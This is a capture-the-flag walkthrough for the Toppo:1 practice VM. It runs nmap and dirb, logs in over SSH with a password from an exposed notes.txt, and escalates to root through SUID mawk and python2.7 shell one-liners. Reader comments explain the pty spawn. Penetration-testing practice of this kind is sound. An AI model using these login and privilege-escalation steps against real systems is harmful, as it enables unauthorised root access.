@@ -1,0 +1,325 @@
+
+								
+																		Hack The Toppo:1 VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on July 14, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve the latest CTF challenge presented by vulnhub for penetration practice and design by Mr. Hadi Mene. This lab is the proposal for beginners and mode of difficulty level is easy. You can download it from this Link: https://www.vulnhub.com/entry/toppo-1,245/
+Penetration Methodologies
+
+Network scanning
+Directory brute-force attack
+Abusing HTTP web directories
+Compromise confidential
+Spawn tty shell (ssh login)
+SUID privilege escalation
+Get root access and capture the flag
+
+Let’s Begin!!
+You will get target VM machine IP at the time of boot-up so let’s start with nmap port enumeration and execute the following command in our terminal.
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.1.104
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.1.104
+					
+				
+			
+		
+
+
+Since port 80 was opened; so I explored target IP in the web browser and welcomed by following the web page as shown below.
+
+Unfortunately, I didn’t compute any remarkable hint from its web home page, therefore, I decided to launch directory brute-force attack through ‘dirb’ and run following command.
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.1.104
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.1.104
+					
+				
+			
+		
+
+The minute you will execute the above command you will found so many web directories. Here /admin looks more interesting, let’s figure out it.
+
+So when I explored the following URL, it put-up a notes.txt file which might be holding something important.
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.104/admin
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.104/admin
+					
+				
+			
+		
+
+
+So I looked into notes.txt and notice towards “12345ted123” which is a password.
+
+Since port 22 was open so I can try ssh login and as we already have the password 12345ted123 but don’t know the username, therefore, I decided to use the hit-try method and use following credential for ssh login.
+
+		
+		
+			
+			
+			
+			
+Username: ted (predict from password)
+Password: 12345ted123
+			
+				
+					
+				
+					12
+				
+						Username: ted (predict from password)Password: 12345ted123
+					
+				
+			
+		
+
+Wonderful!! We got login successfully, now move for post-exploitation and try to get root access. Then by using the following command, you can enumerate all binaries having SUID permission.
+
+		
+		
+			
+			
+			
+			
+find / -perm -u=s -type f 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						find / -perm -u=s -type f 2&gt;/dev/null
+					
+				
+			
+		
+
+And it dumped all system binaries which have SUID permissions but /usr/bin.mawk and /usr/bin/python2.7 are at my target point for escalating root privilege through them. So I had exploited this VM twice to root access.
+Run the following command and get the root access directly.
+
+		
+		
+			
+			
+			
+			
+mawk 'BEGIN {system("/bin/sh")}'
+id
+cd /root
+ls
+cat flag.txt
+			
+				
+					
+				
+					12345
+				
+						mawk 'BEGIN {system("/bin/sh")}'idcd /rootlscat flag.txt
+					
+				
+			
+		
+
+This was the 1st technique for escalating root privilege through awk one-liner.
+
+Similarly, you can perform the same task by using python one-liner and can spawn the root shell.
+
+		
+		
+			
+			
+			
+			
+python2.7 -c 'import pty;pty.spawn("/bin/sh")'
+whoami
+cat /root/flag.txt
+			
+				
+					
+				
+					123
+				
+						python2.7 -c 'import pty;pty.spawn("/bin/sh")'whoamicat /root/flag.txt
+					
+				
+			
+		
+
+B000MM!!! We have captured the flag and challenges is completed.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Alden July 31, 2018 at 8:16 pm							
+							
+							
+														
+							
+								Hi, I’m new in CTF, and was wondering if you could please share a little more detail on the command 
+python2.7 -c ‘import pty;pty.spawn(“/bin/sh”)’
+that you used here?
+Thanks
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Mark December 11, 2018 at 1:42 pm							
+							
+							
+														
+							
+								@Alden
+python2.7 -c mean that’s we are going to run a python command directly from terminal without writing a file.
+ then the ‘import pty;pty.spawn(“/bin/sh”)’  is composed from two statements
+“import pty” is to import the pty python module and pty.spawn(“/bin/sh”) is for spawning a process in this case it’s /bin/sh so it’s gonna spawn a root shell cuz as you know /bin/python2.7 have SUID permissions .
+more info about python 2 and “pty” module:
+https://docs.python.org/2/library/pty.html
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Mark December 11, 2018 at 1:44 pm							
+							
+							
+														
+							
+								python2.7 -c mean that’s we are going to run a python command directly from terminal without writing a file.
+ then the ‘import pty;pty.spawn(“/bin/sh”)’ is for spawning a process in this case it’s /bin/sh so it’s gonna spawn a root shell cuz as you know /bin/python2.7 have SUID permissions
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
